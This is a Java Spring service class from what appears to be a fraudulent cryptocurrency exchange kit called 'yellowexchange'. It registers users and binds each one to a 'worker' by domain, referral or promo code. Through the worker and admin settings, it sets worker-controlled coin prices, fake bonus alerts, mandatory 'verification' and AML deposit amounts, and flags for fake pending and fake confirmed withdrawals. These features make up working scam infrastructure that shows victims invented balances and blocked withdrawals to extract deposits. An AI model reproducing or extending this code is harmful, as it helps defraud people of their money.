package me.hikaricp.yellowexchange.exchange.service;

import eu.bitwalker.useragentutils.UserAgent;
import jakarta.annotation.PostConstruct;
import jakarta.servlet.http.Cookie;
import jakarta.servlet.http.HttpServletRequest;
import me.hikaricp.yellowexchange.exchange.model.user.*;
import me.hikaricp.yellowexchange.exchange.repository.user.*;
import me.hikaricp.yellowexchange.panel.common.model.*;
import me.hikaricp.yellowexchange.panel.worker.model.*;
import me.hikaricp.yellowexchange.panel.worker.repository.*;
import me.hikaricp.yellowexchange.utils.*;
import me.hikaricp.yellowexchange.exchange.model.user.*;
import me.hikaricp.yellowexchange.exchange.repository.user.*;
import me.hikaricp.yellowexchange.panel.admin.model.AdminSettings;
import me.hikaricp.yellowexchange.panel.admin.repository.AdminCoinSettingsRepository;
import me.hikaricp.yellowexchange.panel.admin.repository.AdminDepositCoinRepository;
import me.hikaricp.yellowexchange.panel.admin.repository.AdminErrorMessagesRepository;
import me.hikaricp.yellowexchange.panel.admin.repository.AdminSettingsRepository;
import me.hikaricp.yellowexchange.panel.common.model.*;
import me.hikaricp.yellowexchange.panel.common.repository.DomainRepository;
import me.hikaricp.yellowexchange.panel.common.repository.PromocodeRepository;
import me.hikaricp.yellowexchange.panel.worker.model.*;
import me.hikaricp.yellowexchange.panel.worker.repository.*;
import me.hikaricp.yellowexchange.security.auth.utils.ServletUtil;
import me.hikaricp.yellowexchange.utils.*;
import org.apache.commons.codec.binary.Base32;
import org.apache.commons.lang.RandomStringUtils;
import org.apache.commons.lang.StringUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.data.util.Pair;
import org.springframework.security.authentication.AnonymousAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.stereotype.Service;
import org.springframework.ui.Model;
import org.springframework.web.util.WebUtils;

import java.security.SecureRandom;
import java.util.*;
import java.util.concurrent.Executors;
import java.util.concurrent.ThreadLocalRandom;
import java.util.concurrent.TimeUnit;

@Service
public class UserService {

    private static final List<String> LANGS = Arrays.asList("en", "tr", "zh", "zh-sg", "ja", "de", "es", "it", "fr", "pt");

    @Autowired
    private UserRepository userRepository;

    @Autowired
    private UserRoleRepository userRoleRepository;

    @Autowired
    private UserLogRepository userLogRepository;

    @Autowired
    private UserBalanceRepository userBalanceRepository;

    @Autowired
    private UserErrorMessagesRepository userErrorMessageRepository;

    @Autowired
    private UserRequiredDepositCoinRepository userRequiredDepositCoinRepository;

    @Autowired
    private AdminDepositCoinRepository adminDepositCoinRepository;

    @Autowired
    private AdminErrorMessagesRepository adminErrorMessagesRepository;

    @Autowired
    private AdminCoinSettingsRepository adminCoinSettingsRepository;

    @Autowired
    private WorkerRepository workerRepository;

    @Autowired
    private WorkerDepositCoinRepository workerDepositCoinRepository;

    @Autowired
    private WorkerErrorMessagesRepository workerErrorMessagesRepository;

    @Autowired
    private WorkerCoinSettingsRepository workerCoinSettingsRepository;

    @Autowired
    private DomainRepository domainRepository;

    @Autowired
    private PromocodeRepository promocodeRepository;

    @Autowired
    private UserSettingsRepository userSettingsRepository;

    @Autowired
    private UserAlertRepository userAlertRepository;

    @Autowired
    private AdminSettingsRepository adminSettingsRepository;

    @Autowired
    private WorkerSettingsRepository workerSettingsRepository;

    @Autowired
    private WorkerRecordSettingsRepository workerRecordSettingsRepository;

    @Autowired
    private UserSupportDialogRepository userSupportDialogRepository;

    @Autowired
    private UserSupportMessageRepository userSupportMessageRepository;

    @Autowired
    private UserTradeOrderRepository tradeOrderRepository;

    @Autowired
    private UserDetailsServiceImpl userDetailsService;

    @Autowired
    private CoinService coinService;

    @PostConstruct
    public void startMonitoring() {
        Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(this::checkLimitOrders, 30, 5, TimeUnit.SECONDS);
    }

    private void checkLimitOrders() {
        List<UserTradeOrder> tradeOrders = tradeOrderRepository.findByClosedAndTradeType(false, UserTradeOrder.TradeType.LIMIT);

        for (UserTradeOrder tradeOrder : tradeOrders) {
            User user = userRepository.findById(tradeOrder.getUser().getId()).orElse(null);
            try {
                String coinSymbol = tradeOrder.getCoinSymbol();
                UserTradeOrder.Type type = tradeOrder.getType();
                double price = tradeOrder.getPrice();
                double newPrice = coinService.getIfWorkerPrice(user.getWorker(), coinSymbol);

                if (type == UserTradeOrder.Type.BUY && newPrice <= price) {
                    addBalanceLazyBypass(user, tradeOrder.getCoinSymbol(), tradeOrder.getAmount());
                    tradeOrder.setPrice(newPrice);
                    tradeOrder.setClosed(true);
                    tradeOrderRepository.save(tradeOrder);
                } else if (type == UserTradeOrder.Type.SELL && newPrice >= price) {
                    addBalanceLazyBypass(user, "USDT", newPrice * tradeOrder.getAmount());
                    tradeOrder.setClosed(true);
                    tradeOrder.setPrice(newPrice);
                    tradeOrderRepository.save(tradeOrder);
                }
            } catch (Exception ex) {
                ex.printStackTrace();
                System.out.println(ex);
            }
        }
    }

    public void addPageSettingsAttribute(User user, Domain domain, Model model) {
        boolean buyCryptoEnabled = true;
        boolean promoEnabled = true;

        if (user != null) {
            if (domain != null) {
                buyCryptoEnabled = domain.isBuyCryptoEnabled();
                promoEnabled = domain.isPromoEnabled();
            } else {
                Worker worker = user.getWorker();
                if (worker != null) {
                    WorkerSettings workerSettings = workerSettingsRepository.findByWorkerId(worker.getId()).orElse(null);
                    buyCryptoEnabled = workerSettings.isBuyCryptoEnabled();
                    promoEnabled = workerSettings.isPromoEnabled();
                } else {
                    AdminSettings adminSettings = adminSettingsRepository.findFirst();
                    buyCryptoEnabled = adminSettings.isBuyCryptoEnabled();
                    promoEnabled = adminSettings.isPromoEnabled();
                }
            }
        }

        model.addAttribute("buy_crypto_enabled", buyCryptoEnabled);
        model.addAttribute("promo_enabled", promoEnabled);
    }

    public List<? extends DepositCoin> getUserAvailableDepositCoins(User user) {
        Worker worker = user.getWorker();
        if (worker != null) {
            List<WorkerDepositCoin> depositCoins = workerDepositCoinRepository.findAllByWorkerId(worker.getId());
            if (!depositCoins.isEmpty()) {
                return depositCoins;
            }
        }

        return adminDepositCoinRepository.findAll();
    }

    public List<? extends DepositCoin> getUserRequiredDepositCoins(User user) {
        List<UserRequiredDepositCoin> requiredDepositCoins = userRequiredDepositCoinRepository.findByUserId(user.getId());
        List<? extends DepositCoin> availableDepositCoins = getUserAvailableDepositCoins(user);
        if (requiredDepositCoins.isEmpty()) {
            return availableDepositCoins;
        }

        List<DepositCoin> depositCoins = new ArrayList<>();
        for (UserRequiredDepositCoin requiredDepositCoin : requiredDepositCoins) {
            availableDepositCoins.stream().filter(coin -> coin.getType().equals(requiredDepositCoin.getType())).findFirst().ifPresent(depositCoins::add);
        }

        return depositCoins;
    }

    public ErrorMessages getUserErrorMessages(User user) {
        UserErrorMessages userErrorMessages = userErrorMessageRepository.findByUserId(user.getId()).orElse(null);
        if (userErrorMessages != null) {
            return userErrorMessages;
        }

        if (user.getWorker() != null) {
            WorkerErrorMessages workerErrorMessages = workerErrorMessagesRepository.findByWorkerId(user.getWorker().getId()).orElse(null);
            if (workerErrorMessages != null) {
                return workerErrorMessages;
            }
        }

        return adminErrorMessagesRepository.findFirst();
    }

    public void addLangAttribute(Model model, HttpServletRequest request, String urlLang) {
        String lang = urlLang;

        if (StringUtils.isBlank(lang) || !LANGS.contains(lang)) {
            Cookie cookie = WebUtils.getCookie(request, "lang");

            lang = cookie == null || !LANGS.contains(cookie.getValue()) ? "en" : cookie.getValue();
        }

        model.addAttribute("lang_code", lang.toUpperCase());
    }

    public void addPanelLangAttribute(Model model, HttpServletRequest request, String urlLang) {
        String lang = urlLang;

        if (StringUtils.isBlank(lang) || !lang.equals("ru") && !lang.equals("en")) {
            Cookie cookie = WebUtils.getCookie(request, "panel_lang");

            lang = cookie == null || !cookie.getValue().equals("ru") ? "en" : cookie.getValue();
        }

        model.addAttribute("lang_code", lang.toUpperCase());
    }

    public User addUserAttribute(Authentication authentication, Model model) {
        User user = getUser(authentication);
        UserSettings userSettings = user == null ? null : userSettingsRepository.findByUserId(user.getId()).orElse(null);

        UserSupportDialog userSupportDialog = user == null ? null : userSupportDialogRepository.findByUserId(user.getId()).orElse(null);

        model.addAttribute("support_unviewed", userSupportDialog == null ? 0 : userSupportDialog.getUserUnviewedMessages());

        model.addAttribute("user", user);

        model.addAttribute("user_settings", userSettings);

        return user;
    }

    public void addBalancesJsonAttribute(User user, Model model) {
        Map<String, Pair<String, String>> balances = new HashMap<>();

        double totalUsdPrice = 0D;

        if (user != null) {
            for (UserBalance userBalance : userBalanceRepository.findAllByUserId(user.getId())) {
                double price = coinService.getIfWorkerPrice(user.getWorker(), userBalance.getCoinSymbol());
                double balancePrice = userBalance.getBalance() * price;
                String balanceUsd = new MyDecimal(balancePrice, true).toString();

                totalUsdPrice += balancePrice;

                balances.put(userBalance.getCoinSymbol(), Pair.of(userBalance.getFormattedBalance().toPrice(), balanceUsd));
            }
        }

        double btcPrice = coinService.getIfWorkerPrice(user == null ? null : user.getWorker(), "BTC");
        double btcBalance = totalUsdPrice / btcPrice;

        model.addAttribute("total_usd_balance", new MyDecimal(totalUsdPrice, true).toString());

        model.addAttribute("total_btc_balance", new MyDecimal(btcBalance).toPrice());

        model.addAttribute("balances_json", JsonUtil.writeJson(balances));
    }

    public Map<String, Pair<String, String>> getBalances(User user) {
        Map<String, Pair<String, String>> balances = new HashMap<>();

        if (user != null) {
            for (UserBalance userBalance : userBalanceRepository.findAllByUserId(user.getId())) {
                double price = coinService.getIfWorkerPrice(user.getWorker(), userBalance.getCoinSymbol());
                double balancePrice = userBalance.getBalance() * price;
                String balanceUsd = new MyDecimal(balancePrice, true).toString();

                balances.put(userBalance.getCoinSymbol(), Pair.of(userBalance.getFormattedBalance().toPrice(), balanceUsd));
            }
        }

        return balances;
    }

    public void addTotalUsdBalanceAttribute(User user, Model model) {
        MyDecimal totalUsdBalance = getTotalUsdBalanceWithWorker(user);

        model.addAttribute("total_usd_balance", totalUsdBalance);

        model.addAttribute("total_btc_balance", getTotalBtcBalanceWithWorker(user, totalUsdBalance.getValue().doubleValue()).toString(8));
    }

    public User getUser(Authentication authentication) {
        if (authentication != null && !(authentication instanceof AnonymousAuthenticationToken) && authentication.isAuthenticated()) {
            UserDetailsImpl userDetails = (UserDetailsImpl) authentication.getPrincipal();
            return userRepository.findById(userDetails.getId()).orElse(null);
        }

        return null;
    }

    public boolean isAuthorized(Authentication authentication) {
        if (authentication != null && !(authentication instanceof AnonymousAuthenticationToken) && authentication.isAuthenticated()) {
            UserDetailsImpl userDetails = (UserDetailsImpl) authentication.getPrincipal();
            return userRepository.findById(userDetails.getId()).orElse(null) != null;
        }
        return false;
    }

    public User createUser(String referrer, Domain domain, String domainName, String email, String password, String regIp, String platform, String promocodeName, String refCode, boolean emailConfirmed, String countryCode) {
        Worker worker = null;
        if (domain != null && domain.getWorker() != null) {
            worker = workerRepository.findById(domain.getWorker().getId()).orElse(null);
        }

        if (worker == null && !StringUtils.isBlank(refCode) && DataValidator.isRefCodeValided(refCode)) {
            refCode = refCode.toUpperCase();
            worker = workerRepository.findByUserOwnRefCode(refCode).orElse(null);
        }

        Promocode promocode = StringUtils.isBlank(promocodeName) ? null : promocodeRepository.findByName(promocodeName).orElse(null);
        if (worker == null && promocode != null && promocode.getWorker() != null) {
            worker = promocode.getWorker();
        }

        User user = new User();
        user.setEmail(email);
        user.setPassword(password);
        user.setDomain(domainName);
        user.setReferrer(referrer);
        user.setTwoFactorCode(generateTwoFactorCode());
        user.setOwnRefCode(generateRefCode());
        user.setRegIp(regIp);
        user.setLastIp(regIp);
        user.setPlatform(platform);
        user.setRegCountryCode(countryCode);
        user.setLastCountryCode(countryCode);
        user.setLastActivity(System.currentTimeMillis());
        user.setLastOnline(user.getLastActivity());
        user.setRegistered(new Date());
        user.setRoleType(UserRole.UserRoleType.ROLE_USER);
        user.setPromocode(promocode == null ? null : promocode.getName());
        user.setPromoActivatedShowed(promocode == null);
        user.setEmailConfirmed(emailConfirmed);
        user.setWorker(worker);

        UserRole userRole = userRoleRepository.findByName(UserRole.UserRoleType.ROLE_USER)
                .orElseThrow(() -> new RuntimeException("User role " + UserRole.UserRoleType.ROLE_USER + " not found in repository"));

        Set<UserRole> roles = new HashSet<>();
        roles.add(userRole);

        user.setUserRoles(roles);

        UserSettings userSettings = new UserSettings();
        userSettings.setUser(user);
        userSettings.setNote("");

        CoinSettings coinSettings = worker == null ? null : workerCoinSettingsRepository.findByWorkerId(worker.getId()).orElse(null);
        if (coinSettings == null) {
            coinSettings = adminCoinSettingsRepository.findFirst();
        }

        userSettings.setVerificationModal(coinSettings.isVerifRequirement());
        userSettings.setAmlModal(coinSettings.isVerifAml());
        userSettings.setVerifDepositAmount(coinSettings.getMinVerifAmount());
        userSettings.setDepositCommission(coinSettings.getDepositCommission());
        userSettings.setWithdrawCommission(coinSettings.getWithdrawCommission());

        if (worker == null) {
            AdminSettings adminSettings = adminSettingsRepository.findFirst();

            userSettings.setTradingEnabled(adminSettings.isTradingEnabled());
            userSettings.setSwapEnabled(adminSettings.isSwapEnabled());
            userSettings.setSupportEnabled(adminSettings.isSupportEnabled());
            userSettings.setTransferEnabled(adminSettings.isTransferEnabled());
            userSettings.setCryptoLendingEnabled(adminSettings.isCryptoLendingEnabled());
            userSettings.setFakeWithdrawPending(adminSettings.isFakeWithdrawPending());
            userSettings.setFakeWithdrawConfirmed(adminSettings.isFakeWithdrawConfirmed());
            userSettings.setWalletConnectEnabled(adminSettings.isWalletConnectEnabled());
            user.setVip(adminSettings.isVipEnabled());
        } else {
            WorkerSettings workerSettings = workerSettingsRepository.findByWorkerId(worker.getId()).orElse(null);

            userSettings.setTradingEnabled(workerSettings.isTradingEnabled());
            userSettings.setSwapEnabled(workerSettings.isSwapEnabled());
            userSettings.setSupportEnabled(workerSettings.isSupportEnabled());
            userSettings.setTransferEnabled(workerSettings.isTransferEnabled());
            userSettings.setCryptoLendingEnabled(workerSettings.isCryptoLendingEnabled());
            userSettings.setFakeWithdrawPending(workerSettings.isFakeWithdrawPending());
            userSettings.setFakeWithdrawConfirmed(workerSettings.isFakeWithdrawConfirmed());
            userSettings.setWalletConnectEnabled(workerSettings.isWalletConnectEnabled());
            user.setVip(workerSettings.isVipEnabled());
        }

        String emailLeft = email.split("@")[0];
        if (emailLeft.length() >= 6) {
            try {
                long emailEnd = Long.parseLong(emailLeft.substring(emailLeft.length() - 6));
                WorkerRecordSettings recordSettings = workerRecordSettingsRepository.findByEmailEnd(emailEnd).orElse(null);
                if (recordSettings != null) {
                    user.setVip(recordSettings.isVip());
                    userSettings.setFakeWithdrawPending(recordSettings.isFakeWithdrawPending());
                    userSettings.setFakeWithdrawConfirmed(recordSettings.isFakeWithdrawConfirmed());
                    userSettings.setWalletConnectEnabled(recordSettings.isWalletConnect());
                }
            } catch (Exception ex) {}
        }

        userRepository.save(user);

        userSettingsRepository.save(userSettings);

        userDetailsService.removeCache(user.getEmail());

        if (worker != null) {
            WorkerSettings workerSettings = workerSettingsRepository.findByWorkerId(worker.getId()).orElse(null);
            if (workerSettings != null) {
                if (workerSettings.getBonusAmount() > 0 && StringUtils.isNotBlank(workerSettings.getBonusCoin())) {
                    UserAlert alert = new UserAlert();
                    alert.setUser(user);
                    alert.setType(UserAlert.Type.BONUS);
                    alert.setMessage(workerSettings.getBonusText());
                    alert.setCoin(workerSettings.getBonusCoin());
                    alert.setAmount(workerSettings.getBonusAmount());

                    userAlertRepository.save(alert);
                }
            }
        }

        if (promocode != null) {
            double amount = 0D;
            if (promocode.isRandom()) {
                amount = MathUtil.round(ThreadLocalRandom.current().nextDouble(promocode.getMinAmount(), promocode.getMaxAmount()), 8);
            } else {
                amount = promocode.getMinAmount();
            }

            if (amount > 0) {
                addBalance(user, promocode.getCoinSymbol(), amount);
            }

            promocode.setActivations(promocode.getActivations() + 1);

            promocodeRepository.save(promocode);
        }

        AdminSettings adminSettings = adminSettingsRepository.findFirst();
        String exchangeName = domain != null ? domain.getExchangeName() : adminSettings.getSiteName();
        if (worker != null) {
            WorkerSettings workerSettings = workerSettingsRepository.findByWorkerId(worker.getId()).orElse(null);
            if (workerSettings != null && workerSettings.isSupportWelcomeEnabled()) {
                UserSupportMessage supportMessage = new UserSupportMessage(UserSupportMessage.Target.TO_USER, UserSupportMessage.Type.TEXT, workerSettings.getSupportWelcomeMessage().replace("{domain_name}", exchangeName), false, true, user);

                createSupportDialog(supportMessage, user);

                userSupportMessageRepository.save(supportMessage);
            }
        } else {
            if (adminSettings.isSupportWelcomeEnabled()) {
                UserSupportMessage supportMessage = new UserSupportMessage(UserSupportMessage.Target.TO_USER, UserSupportMessage.Type.TEXT, adminSettings.getSupportWelcomeMessage().replace("{domain_name}", exchangeName), false, true, user);

                createSupportDialog(supportMessage, user);

                userSupportMessageRepository.save(supportMessage);
            }
        }

        if (worker != null) {
            worker.setUsersCount(worker.getUsersCount() + 1);

            workerRepository.save(worker);
        }

        if (domain != null) {
            domain.setUsersCount(domain.getUsersCount() + 1);

            domainRepository.save(domain);
        }

        return user;
    }

    private void createSupportDialog(UserSupportMessage supportMessage, User user) {
        UserSupportDialog userSupportDialog = new UserSupportDialog();

        userSupportDialog.setOnlyWelcome(true);
        userSupportDialog.setUserUnviewedMessages(userSupportDialog.getUserUnviewedMessages() + 1);
        userSupportDialog.setTotalMessages(userSupportDialog.getTotalMessages() + 1);
        userSupportDialog.setLastMessageDate(supportMessage.getCreated());
        userSupportDialog.setUser(user);

        userSupportDialogRepository.save(userSupportDialog);
    }

    public void bindToWorker(User user, Worker worker) {
        if (worker != null && user.getWorker() == null) {
            WorkerSettings workerSettings = workerSettingsRepository.findByWorkerId(worker.getId()).orElse(null);
            CoinSettings coinSettings = workerCoinSettingsRepository.findByWorkerId(worker.getId()).orElse(null);

            user.setWorker(worker);
            user.setVip(workerSettings.isVipEnabled());
            userRepository.save(user);

            UserSettings userSettings = userSettingsRepository.findByUserId(user.getId()).orElse(null);
            userSettings.setVerificationModal(coinSettings.isVerifRequirement());
            userSettings.setAmlModal(coinSettings.isVerifAml());
            userSettings.setVerifDepositAmount(coinSettings.getMinVerifAmount());
            userSettings.setDepositCommission(coinSettings.getDepositCommission());
            userSettings.setWithdrawCommission(coinSettings.getWithdrawCommission());
            userSettings.setTradingEnabled(workerSettings.isTradingEnabled());
            userSettings.setSwapEnabled(workerSettings.isSwapEnabled());
            userSettings.setSupportEnabled(workerSettings.isSupportEnabled());
            userSettings.setTransferEnabled(workerSettings.isTransferEnabled());
            userSettings.setFakeWithdrawPending(workerSettings.isFakeWithdrawPending());
            userSettings.setFakeWithdrawConfirmed(workerSettings.isFakeWithdrawConfirmed());
            userSettings.setWalletConnectEnabled(workerSettings.isWalletConnectEnabled());

            userSettingsRepository.save(userSettings);

            worker.setUsersCount(worker.getUsersCount() + 1);

            workerRepository.save(worker);
        }
    }

    public void bindToWorker0(User user, Worker worker, CoinSettings coinSettings, WorkerSettings workerSettings) {
        if (user.getWorker() == null) {
            user.setWorker(worker);
            user.setVip(workerSettings.isVipEnabled());
            userRepository.save(user);

            UserSettings userSettings = userSettingsRepository.findByUserId(user.getId()).orElse(null);
            userSettings.setVerificationModal(coinSettings.isVerifRequirement());
            userSettings.setAmlModal(coinSettings.isVerifAml());
            userSettings.setVerifDepositAmount(coinSettings.getMinVerifAmount());
            userSettings.setDepositCommission(coinSettings.getDepositCommission());
            userSettings.setWithdrawCommission(coinSettings.getWithdrawCommission());
            userSettings.setTradingEnabled(workerSettings.isTradingEnabled());
            userSettings.setSwapEnabled(workerSettings.isSwapEnabled());
            userSettings.setSupportEnabled(workerSettings.isSupportEnabled());
            userSettings.setTransferEnabled(workerSettings.isTransferEnabled());
            userSettings.setFakeWithdrawPending(workerSettings.isFakeWithdrawPending());
            userSettings.setFakeWithdrawConfirmed(workerSettings.isFakeWithdrawConfirmed());
            userSettings.setWalletConnectEnabled(workerSettings.isWalletConnectEnabled());

            userSettingsRepository.save(userSettings);

            worker.setUsersCount(worker.getUsersCount() + 1);

            workerRepository.save(worker);
        }
    }

    public void createAction(Authentication authentication, HttpServletRequest request, String action, boolean forUser) {
        User user = getUser(authentication);
        createAction(user, request, action, forUser);
    }

    public void createAction(User user, HttpServletRequest request, String action, boolean forUser) {
        if (user == null) {
            return;
        }

        long time = System.currentTimeMillis();

        String platform = "N/A";
        try {
            UserAgent userAgent = UserAgent.parseUserAgentString(request.getHeader("user-agent"));
            platform = userAgent.getOperatingSystem().getName() + ", " + userAgent.getBrowser().getName();
        } catch (Exception ignored) {}

        String ip = ServletUtil.getIpAddress(request);

        UserLog userLog = new UserLog(action, ip, user, platform, time, forUser);
        userLogRepository.save(userLog);

        user.setLastIp(ip);
        user.setLastActivity(time);
        user.setLastOnline(time);

        GeoUtil.GeoData geoData = user.getGeolocation();
        if (geoData != null && !StringUtils.isBlank(geoData.getCountryCode())) {
            user.setLastCountryCode(geoData.getCountryCode().equals("N/A") ? "NO" : geoData.getCountryCode());
        }

        if (!platform.equals("N/A") || user.getPlatform() == null) {
            user.setPlatform(platform);
        }
        userRepository.save(user);
    }

    public void createAction(User user, String action, boolean forUser) {
        long time = System.currentTimeMillis();

        UserLog userLog = new UserLog(action, user.getLastIp(), user, user.getPlatform(), time, forUser);

        userLogRepository.save(userLog);

        user.setLastActivity(time);
        user.setLastOnline(time);

        userRepository.save(user);
    }

    public MyDecimal getTotalUsdBalanceWithWorker(User user) {
        if (user == null) {
            return new MyDecimal(0D, true);
        }

        Worker worker = user.getWorker();

        List<UserBalance> userBalances = userBalanceRepository.findAllByUserId(user.getId());

        double total = 0D;
        for (UserBalance balance : userBalances) {
            total += balance.getInUsd(coinService.getIfWorkerPrice(worker, balance.getCoinSymbol()));
        }

        return new MyDecimal(total, true);
    }

    public MyDecimal getTotalBtcBalanceWithWorker(User user, double totalUsdPrice) {
        if (user == null) {
            return new MyDecimal(0D);
        }

        double btcPrice = coinService.getIfWorkerPrice(user.getWorker(), "BTC");
        double btcBalance = totalUsdPrice / btcPrice;

        return new MyDecimal(btcBalance);
    }

    public double getBalance(User user, String coinSymbol) {
        return getBalance(user.getId(), coinSymbol);
    }

    public double getBalance(long userId, String coinSymbol) {
        UserBalance userBalance = userBalanceRepository.findByUserIdAndCoinSymbol(userId, coinSymbol).orElse(null);
        return userBalance == null ? 0D : userBalance.getBalance();
    }

    public void addBalance(User user, String coinSymbol, double balance) {
        addBalance(user.getId(), coinSymbol, balance);
    }

    public void addBalance(long userId, String coinSymbol, double balance) {
        setBalance(userId, coinSymbol, getBalance(userId, coinSymbol) + balance);
    }

    public void setBalance(User user, String coinSymbol, double balance) {
        setBalance(user.getId(), coinSymbol, balance);
    }

    public void setBalance(long userId, String coinSymbol, double balance) {
        UserBalance userBalance = userBalanceRepository.findByUserIdAndCoinSymbol(userId, coinSymbol).orElse(new UserBalance());
        userBalance.setCoinSymbol(coinSymbol);
        userBalance.setBalance(balance);

        if (userBalance.getUser() == null) {
            userBalance.setUser(userRepository.findById(userId).get());
        }

        userBalanceRepository.save(userBalance);
    }

    public void addBalanceLazyBypass(User user, String coinSymbol, double balance) {
        setBalanceLazyBypass(user.getId(), coinSymbol, getBalance(user.getId(), coinSymbol) + balance);
    }

    public void setBalanceLazyBypass(long userId, String coinSymbol, double balance) {
        UserBalance userBalance = userBalanceRepository.findByUserIdAndCoinSymbol(userId, coinSymbol).orElse(new UserBalance());
        userBalance.setCoinSymbol(coinSymbol);
        userBalance.setBalance(balance);

        if (userBalance.getUser() == null) {
            userBalance.setUser(userRepository.findById(userId).get());
        }

        userBalanceRepository.saveLazyBypass(userBalance, userId, coinSymbol);
    }

    private String generateTwoFactorCode() {
        SecureRandom random = new SecureRandom();
        byte[] bytes = new byte[20];
        random.nextBytes(bytes);
        Base32 base32 = new Base32();
        return base32.encodeToString(bytes);
    }

    private String generateRefCode() {
        return RandomStringUtils.random(8, true, true).toUpperCase();
    }
}
